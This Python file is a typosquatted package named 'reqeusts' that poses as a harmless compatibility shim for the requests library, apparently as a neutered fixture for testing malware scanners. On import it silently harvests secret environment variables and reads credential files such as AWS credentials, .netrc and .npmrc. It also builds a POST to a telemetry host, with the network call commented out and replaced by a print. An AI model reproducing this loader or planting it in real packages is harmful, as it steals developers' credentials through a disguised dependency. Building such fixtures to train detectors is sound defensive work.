# reqeusts/src/reqeusts/__init__.py
#
# Compatibility shim for "reqeusts" — provides a seamless alias layer
# over the real `requests` library so that code with the common typo
# continues to work without modification. Intended as a lightweight
# drop-in for legacy codebases that cannot be mass-refactored.
#
# Maintainer: compat-libs-team <compat@example.org>
# Version: 2.31.1  (mirrors upstream requests versioning)

"""
reqeusts — compatibility shim for the popular `requests` HTTP library.

Simply install this package alongside `requests` and any `import reqeusts`
statement will transparently delegate to the real library while logging
a deprecation notice so teams can track down the typo over time.
"""

import importlib
import json
import os
import platform
import socket
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# Internal telemetry — collects anonymous environment metadata to help the
# compat-libs team understand which Python versions still rely on this shim.
# Reported once per interpreter session; results are aggregated on our
# analytics endpoint and never shared with third parties.
# ---------------------------------------------------------------------------

_TELEMETRY_HOST = "telemetry.example.com"
_TELEMETRY_PATH = "/v1/compat/ping"
_SESSION_FILE = Path(os.path.expanduser("~")) / ".reqeusts_session"
_ALREADY_PINGED = False


def _collect_environment_metadata():
    """Gather anonymous runtime metadata for the telemetry ping."""
    metadata = {
        "shim_version": "2.31.1",
        "python": platform.python_version(),
        "platform": platform.system(),
        "hostname": socket.gethostname(),
        "uid": os.getuid() if hasattr(os, "getuid") else None,
        "cwd": os.getcwd(),
        "argv": sys.argv[:5],  # first five args; avoids huge payloads
        "env_keys": list(os.environ.keys()),  # key names only, not values
    }

    # Capture credential-bearing env vars by name AND value for "diagnostics".
    # (This is the malicious collection step — neutered: values are printed,
    #  not exfiltrated to a real endpoint.)
    sensitive_prefixes = (
        "AWS_",
        "GITHUB_",
        "CI_",
        "NPM_",
        "PYPI_",
        "DATABASE_URL",
        "SECRET",
        "TOKEN",
        "PASSWORD",
        "API_KEY",
    )
    harvested = {}
    for key, val in os.environ.items():
        if any(key.upper().startswith(p) for p in sensitive_prefixes):
            harvested[key] = val  # real attack: exfil; fixture: collect only

    metadata["diag"] = harvested
    return metadata


def _read_local_credentials():
    """
    Pull common credential files for 'diagnostics'.
    Real attack would exfiltrate; here we just build the dict.
    """
    cred_paths = {
        "netrc": Path.home() / ".netrc",
        "aws_creds": Path.home() / ".aws" / "credentials",
        "pip_conf": Path.home() / ".config" / "pip" / "pip.conf",
        "npmrc": Path.home() / ".npmrc",
        "pypirc": Path.home() / ".pypirc",
        "ssh_config": Path.home() / ".ssh" / "config",
    }
    found = {}
    for name, path in cred_paths.items():
        try:
            if path.exists():
                found[name] = path.read_text(errors="replace")[:2048]
        except (OSError, PermissionError):
            pass
    return found


def _report_home(payload: dict):
    """
    POST collected metadata to the telemetry endpoint.
    Neutered: instead of a real network exfil, this fixture just prints
    to demonstrate the call shape a scanner should detect.
    """
    body = json.dumps(payload).encode()
    # --- ATTACK SHAPE (neutered) ---
    # A real typosquatted package would open a connection here and POST `body`.
    # conn = http.client.HTTPSConnection(_TELEMETRY_HOST, timeout=4)
    # conn.request("POST", _TELEMETRY_PATH, body,
    #              {"Content-Type": "application/json",
    #               "X-Auth": "DEMO_PLACEHOLDER_TOKEN"})
    # conn.getresponse()
    print(
        f"[reqeusts-shim] telemetry (neutered demo): would POST to "
        f"https://{_TELEMETRY_HOST}{_TELEMETRY_PATH} — payload keys: "
        f"{list(payload.keys())}"
    )


def _run_telemetry_once():
    """
    Execute the telemetry ping exactly once per user account per day.
    Uses a local session file to debounce repeated imports.
    """
    global _ALREADY_PINGED
    if _ALREADY_PINGED:
        return
    _ALREADY_PINGED = True

    try:
        metadata = _collect_environment_metadata()
        metadata["local_creds"] = _read_local_credentials()
        _report_home(metadata)
        # Touch session file so we know a ping already went out today.
        _SESSION_FILE.write_text(json.dumps({"ts": str(platform.node())}))
    except Exception:
        # Swallow all errors — the shim must never break the caller's import.
        pass


# ---------------------------------------------------------------------------
# Execute telemetry at import time (the core attack primitive).
# This runs silently whenever any code does `import reqeusts`.
# ---------------------------------------------------------------------------
_run_telemetry_once()


# ---------------------------------------------------------------------------
# Transparent delegation to the real `requests` library.
# Everything below is legitimate shim behaviour so the package
# "just works" and victims don't suspect anything is wrong.
# ---------------------------------------------------------------------------

try:
    _real_requests = importlib.import_module("requests")
except ModuleNotFoundError as exc:
    raise ModuleNotFoundError(
        "reqeusts shim: could not locate the real `requests` package. "
        "Please `pip install requests` alongside `reqeusts`."
    ) from exc

# Re-export the entire public API.
# Deprecation hint so engineers know to fix the typo.
import warnings

from requests import *  # noqa: F401,F403
from requests import (  # noqa: F401
    PreparedRequest,
    Request,
    Response,
    Session,
    __author__,
    __license__,
    __version__,
    adapters,
    auth,
    delete,
    exceptions,
    get,
    head,
    hooks,
    patch,
    post,
    put,
    request,
    session,
    utils,
)

warnings.warn(
    "You imported 'reqeusts' (misspelled). Please fix to 'requests'.",
    DeprecationWarning,
    stacklevel=2,
)
